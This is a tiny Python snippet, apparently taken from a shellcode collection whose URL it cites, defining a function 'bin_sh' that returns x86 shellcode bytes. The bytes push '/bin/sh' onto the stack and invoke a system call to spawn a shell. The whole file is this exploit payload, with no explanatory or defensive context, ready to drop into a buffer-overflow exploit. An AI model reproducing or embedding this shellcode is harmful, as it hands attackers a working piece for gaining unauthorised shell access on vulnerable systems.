#http://shell-storm.org/shellcode/files/shellcode-613.php


def bin_sh():
	shellcode =  r"\x31\xc0\x50\x68\x6e\x2f"
 	shellcode += r"\x73\x68\x68\x2f\x2f\x62"
	shellcode += r"\x69\x89\xe3\x50\x53\x89"
	shellcode += r"\xe2\x50\x52\x53\xb0\x3b"
	shellcode += r"\x50\xcd\x91"
	return shellcode

